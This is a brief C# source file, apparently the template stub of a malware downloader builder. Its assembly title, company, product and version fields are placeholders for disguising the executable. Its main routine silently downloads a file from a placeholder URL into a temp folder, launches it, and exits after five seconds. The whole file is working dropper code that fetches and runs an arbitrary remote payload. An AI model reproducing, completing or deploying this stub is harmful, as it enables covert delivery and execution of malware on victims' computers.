﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESCRIPTION%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: AssemblyVersion("%PRODUCTVERSION%")]
[assembly: AssemblyFileVersion("%FILEVERSION%")]

namespace DStub
{
    static class Program
    {
        /// <summary>
        /// Der Haupteinstiegspunkt für die Anwendung.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Magic();
            Thread.Sleep(5000);
            Application.Exit();
        }
        static void Magic()
        {
            string dUrl = "%URLREPLACE%";            
            string lPath = Path.GetTempFileName();

            if (File.Exists(lPath))
                File.Delete(lPath);
            lPath = lPath.Split('.')[0] + Path.GetExtension(dUrl);
            new WebClient().DownloadFile(dUrl, lPath);

            Process p = Process.Start(lPath);
            
        }
        
    }
}
